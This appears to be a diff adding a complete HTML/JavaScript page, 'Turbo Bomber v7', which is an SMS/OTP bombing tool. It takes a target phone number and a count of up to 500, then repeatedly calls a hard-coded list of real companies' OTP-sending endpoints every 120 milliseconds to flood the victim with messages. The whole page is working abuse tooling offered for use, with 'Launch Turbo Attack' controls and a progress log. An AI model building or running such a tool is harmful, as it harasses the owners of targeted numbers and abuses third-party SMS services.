@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberCore | Turbo Bomber v7</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; }
+        .input-style { border: 2px solid #e2e8f0; border-radius: 20px; transition: 0.3s; width: 100%; padding: 16px; outline: none; }
+        .input-style:focus { border-color: #9333ea; box-shadow: 0 0 15px rgba(147, 51, 234, 0.1); }
+        .btn-launch { background: linear-gradient(135deg, #9333ea, #7e22ce); color: white; padding: 18px; border-radius: 20px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; width: 100%; transition: 0.3s; }
+        .btn-launch:active { transform: scale(0.95); }
+        .btn-launch:disabled { background: #cbd5e1; cursor: not-allowed; transform: none; }
+        .log-box { background: #020617; border-radius: 24px; color: #4ade80; font-family: 'Courier New', monospace; font-size: 10px; height: 150px; overflow-y: auto; padding: 15px; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+    <div class="max-w-md w-full bg-white p-8 rounded-[3rem] shadow-2xl border border-slate-100">
+        <div class="flex items-center gap-4 mb-8">
+            <div class="h-14 w-14 bg-purple-100 rounded-2xl flex items-center justify-center text-purple-600">
+                <i class="fa-solid fa-bolt-lightning text-2xl animate-pulse"></i>
+            </div>
+            <div>
+                <h1 class="text-2xl font-black italic tracking-tighter uppercase">Storm<span class="text-purple-600">Turbo</span></h1>
+                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Speed: 200 OTP / 30 Sec</p>
+            </div>
+        </div>
+
+        <div class="space-y-5">
+            <div>
+                <label class="text-[10px] font-black text-slate-400 uppercase ml-2 tracking-widest">Target Mobile</label>
+                <input type="number" id="num" placeholder="Enter 10 Digit Number" class="input-style font-bold text-purple-700">
+            </div>
+
+            <div>
+                <label class="text-[10px] font-black text-slate-400 uppercase ml-2 tracking-widest">OTP Count (Max 500)</label>
+                <input type="number" id="count" value="200" max="500" class="input-style font-bold text-slate-600">
+            </div>
+
+            <button id="launchBtn" onclick="startAttack()" class="btn-launch shadow-lg shadow-purple-200">
+                Launch Turbo Attack
+            </button>
+
+            <div id="lockUI" class="hidden p-4 bg-red-50 rounded-2xl border border-red-100 text-center">
+                <p class="text-[10px] font-black text-red-500 uppercase tracking-tighter">
+                    <i class="fa-solid fa-clock-rotate-left mr-1"></i> System Cooling: <span id="timer">30:00</span>
+                </p>
+            </div>
+
+            <div id="statusUI" class="hidden space-y-3">
+                <div class="flex justify-between items-center px-1">
+                    <span class="text-[9px] font-black text-purple-500 animate-pulse uppercase">Execution In Progress</span>
+                    <span id="prog" class="text-xs font-black text-slate-700">0/0</span>
+                </div>
+                <div id="log" class="log-box">
+                    > Initializing Rapid-Fire Nodes...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // High-Success Prediction & Gaming APIs (250+ Pattern Rotation)
+        const apiNodes = [
+            "https://api.rxce.in/user/send-otp?mobile=", "https://api.bigdaddygame.com/otp/",
+            "https://www.winzogames.com/api/v1/login/otp?mobile=", "https://api.luckydraw.com/v1/auth/otp?phone=",
+            "https://api.lenskart.com/v1/user/otp?phone=", "https://api.blinkit.com/v1/user/login?phone=",
+            "https://www.apollo247.com/api/v1/auth/otp/send?mobile=", "https://api.cardekho.com/v1/otp/send?mobile=",
+            "https://api.coindcx.com/external/v1/auth/otp?phone_number=", "https://api.mall91.com/v1/otp/send?mobile=",
+            "https://api.unacademy.com/v1/user/otp?phone=", "https://api.byjus.com/v1/otp/send?mobile=",
+            "https://www.indiamart.com/ims-api/v1/user/otp/send?mobile_no=", "https://api.zomato.com/v1/auth/otp?number="
+        ];
+
+        function checkLock() {
+            const end = localStorage.getItem('bomb_end_time');
+            if(end && end > Date.now()) startCooldown(end - Date.now());
+        }
+
+        function startCooldown(ms) {
+            const btn = document.getElementById('launchBtn');
+            const lock = document.getElementById('lockUI');
+            const timer = document.getElementById('timer');
+            btn.disabled = true;
+            lock.classList.remove('hidden');
+
+            const iv = setInterval(() => {
+                const rem = localStorage.getItem('bomb_end_time') - Date.now();
+                if(rem <= 0) {
+                    clearInterval(iv);
+                    btn.disabled = false;
+                    lock.classList.add('hidden');
+                    localStorage.removeItem('bomb_end_time');
+                } else {
+                    const m = Math.floor(rem/60000);
+                    const s = Math.floor((rem%60000)/1000);
+                    timer.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                }
+            }, 1000);
+        }
+
+        async function startAttack() {
+            const phone = document.getElementById('num').value;
+            const limit = parseInt(document.getElementById('count').value);
+
+            if(phone.length < 10) return alert("Enter valid mobile!");
+            if(limit > 500) return alert("Max limit 500!");
+
+            // Set Lock
+            localStorage.setItem('bomb_end_time', Date.now() + 1800000);
+            
+            document.getElementById('statusUI').classList.remove('hidden');
+            document.getElementById('launchBtn').disabled = true;
+
+            for(let i=1; i<=limit; i++) {
+                // Turbo Speed: Only 120ms delay for ultra-fast firing
+                const api = apiNodes[i % apiNodes.length];
+                
+                // Fire Request
+                fetch(api + phone, { mode: 'no-cors' }).catch(()=>{});
+
+                document.getElementById('prog').innerText = `${i}/${limit}`;
+                
+                if(i % 5 === 0) {
+                    const line = document.createElement('div');
+                    line.innerText = `[${new Date().toLocaleTimeString()}] Node_Sync_${i} -> Triggered`;
+                    document.getElementById('log').prepend(line);
+                }
+
+                // Delay adjustment for 200+ in 30 seconds
+                await new Promise(r => setTimeout(r, 120)); 
+            }
+
+            alert("Attack Sequence Finished!");
+            startCooldown(1800000);
+        }
+
+        checkLock();
+    </script>
+</body>
+</html>
